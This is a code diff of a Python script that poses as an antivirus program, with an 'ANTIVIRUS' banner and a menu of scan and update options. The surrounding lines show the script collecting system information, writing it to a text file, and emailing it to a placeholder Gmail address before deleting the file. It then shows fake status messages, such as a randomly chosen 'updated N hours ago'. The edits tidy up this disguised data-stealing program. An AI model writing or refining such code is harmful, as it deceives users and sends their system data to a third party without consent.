@@ -38,12 +38,13 @@ try:
     import sniffer
     import gmail
     import psutil
+    import datetime
     import wmi
     import logging
     import re
     import uuid
-    import device_detector
     import art
+    import device_detector
     from art import tprint
     from device_detector import DeviceDetector
     from device_detector import SoftwareDetector
@@ -58,7 +59,7 @@ except ImportError as imp:
     else:
         system("sudo pip3 install -r requirements.txt")
 
-#Main program
+#Information Gathering + Writing to txt file & Sending Them
 def get_size(bytes, suffix="B"):
     factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
@@ -108,10 +109,11 @@ message = gmail.Message("Data",to="enteryouremailhere@gmail.com",attachments=["A
 gmail1.send(message)
 time.sleep(2)
 os.remove("AllData.txt")
+
 num=random.randint(1,24)
 
 #Logo
-trpint("ANTIVIRUS",font="tarty1")
+tprint("ANTIVIRUS",font="tarty1")
 
 time.sleep(2)
 print("\n")
@@ -126,7 +128,7 @@ time.sleep(1)
 print("[5] : Database Update")
 time.sleep(1)
 action=int(input("[::] Please enter the action you want to make: "))
-while action <= 0 or action > 5 or action == None:
+while action == None or action < 1 or action > 5:
     print("[!] Invalid Action !")
     time.sleep(2)
     action=int(input("[::] Please enter again: "))
@@ -200,3 +202,4 @@ elif action == 5:
     print("[+] No database update needed")
     time.sleep(2)
     print("[+] The program updated them "+str(num)+" hours ago")
+#End of the program
